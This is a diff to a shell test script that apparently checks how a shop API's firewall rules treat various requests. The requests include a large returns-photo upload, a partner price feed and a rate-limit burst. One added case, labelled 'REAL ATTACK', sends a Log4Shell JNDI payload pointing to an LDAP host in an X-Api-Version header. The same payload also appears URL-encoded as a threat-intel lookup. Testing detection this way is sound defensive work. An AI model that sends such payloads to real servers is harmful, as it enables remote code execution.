@@ -37,7 +37,18 @@ hit "2. Store inventory sync job (python-requests)" custom GET /api/shop/invento
 hit "3. SOC threat-intel lookup (Log4Shell IOC)" managed GET /api/shop/soc/lookup \
   '?ioc=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.66%3A1389%2Fa%7D' "$UA_BROWSER"
 
-echo "  4. Store stock checker: 8 lookups in a burst"
+PHOTO=$(mktemp)
+{ printf '{"orderId":"RET-1042","item":"KALLAX shelf","photo":"data:image/jpeg;base64,'; head -c 600000 /dev/zero | tr '\0' 'Q'; printf '"}'; } > "$PHOTO"
+hit "4. Returns portal: 600 KB damage photo" custom POST /api/shop/returns/photos "" "$UA_BROWSER" \
+  -H 'content-type: application/json' --data-binary @"$PHOTO"
+rm -f "$PHOTO"
+
+hit "5. Partner price feed (Go-http-client)" custom GET /api/shop/prices/feed "?market=se" "Go-http-client/2.0"
+
+hit "6. REAL ATTACK: Log4Shell in X-Api-Version" managed-header GET /api/shop/products "" "curl/8.7.1" \
+  -H 'X-Api-Version: ${jndi:ldap://203.0.113.66:1389/a}'
+
+echo "  7. Store stock checker: 8 lookups in a burst"
 for i in 1 2 3 4 5 6 7 8; do
   hit "     lookup $i" ratelimit GET /api/shop/stock "?item=BILLY-80x28&store=445" "$UA_BROWSER"
 done
